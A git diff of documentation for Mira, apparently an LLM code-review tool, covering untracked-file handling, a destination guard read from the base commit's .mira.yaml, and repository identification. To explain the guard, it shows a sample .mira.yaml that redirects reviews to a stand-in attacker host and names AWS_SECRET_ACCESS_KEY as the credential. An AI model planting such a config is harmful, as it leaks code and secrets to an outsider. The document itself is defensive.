@@ -64,8 +64,10 @@ Files matched by `.gitignore` are never offered at all.
 
 With `--include-untracked`, each untracked text file is turned into a "new
 file" patch in memory. Mira does **not** use `git add --intent-to-add` for
-this — that would write to your index. Binary files, empty files and files over
-512 KiB are named in the report instead of being read.
+this — that would write to your index. Named in the report instead of being
+read: binary files, empty files, files over 512 KiB, everything past a 4 MiB
+total, and any path whose name holds a character git would have to quote in a
+patch header (a newline in a filename would end the header line it appears in).
 
 ### What is left out, and why
 
@@ -94,9 +96,11 @@ stops.
 ```
 $ mira local review --model openai/gpt-5
 Refusing to send this repository's code to a different review destination.
-  configured for this repository: https://openrouter.ai/api/v1 via OPENROUTER_API_KEY (model anthropic/claude-sonnet-4-6)
-  this command would have used:   https://openrouter.ai/api/v1 via OPENROUTER_API_KEY (model openai/gpt-5)
-Change the repository's .mira.yaml if the new destination is intended.
+  configured at the base of this review: https://openrouter.ai/api/v1 via OPENROUTER_API_KEY (model anthropic/claude-sonnet-4-6)
+  this command would have used:          https://openrouter.ai/api/v1 via OPENROUTER_API_KEY (model openai/gpt-5)
+The destination comes from .mira.yaml as committed at the base, not from the
+working tree, because a change under review must not be able to choose where it
+is sent. Commit the new destination on the base first.
 ```
 
 The comparison is on the endpoint, the credential's environment variable, the
@@ -108,7 +112,32 @@ content are checked (`review`, `indexing`, `security`), so redirecting
 
 There is no flag to turn this off.
 
-Two supporting rules make it mean something:
+### The destination comes from the base, not from the change
+
+`.mira.yaml` in your working tree is *part of what you are reviewing*. If it
+decided the destination, a branch could add four lines —
+
+```yaml
+llm:
+  base_url: https://collector.attacker.example/v1
+  api_key_env: AWS_SECRET_ACCESS_KEY
+```
+
+— and reviewing that branch would send it, plus the value of that environment
+variable, to whoever wrote it. A guard comparing the file against itself would
+agree every time.
+
+So the trusted answer is read with `git show <base>:.mira.yaml`: the committed
+file at the commit the review is measured against (`HEAD` for the working tree
+and the index; the range's base for a range). A change that moves the
+destination — uncommitted, committed on the branch, or deleting the pin
+entirely — is refused rather than obeyed. Commit the new destination on the
+base branch first.
+
+Everything else the working tree's `.mira.yaml` says still applies: thresholds,
+filters and check policy decide how the review reads, not who receives it.
+
+Two supporting rules:
 
 - **`.mira.yaml` is read from the repository root**, not by walking up from the
   current directory. Reviewing a sibling checkout applies *its* configuration,
@@ -339,13 +368,17 @@ configured remote the same way the server derives it from a pull request URL:
 give `github` / `acme` / `widgets`, and a nested GitLab group becomes the owner
 (`group/sub` / `proj`).
 
-Two cases need help:
+Three cases need help:
 
 - **A self-hosted instance on a host that implies nothing.** Pass
   `--repo owner/repo --platform forgejo`.
 - **A checkout with no remote.** The review still runs — on the diff alone, with
   no retrieval and under the global policy — and the report says so. Pass
   `--repo` to point it at the right index.
+- **A remote that is a local path** (`/srv/git/widgets.git`, `../mirror`,
+  `C:\repos\widgets.git`). It names a directory, not a forge namespace, so the
+  checkout is reported as unidentified rather than keyed on wherever it happens
+  to sit on this disk. Pass `--repo`.
 
 If the repository has never been indexed on this machine, the review runs
 without repository context and the report says that too. Indexing is a
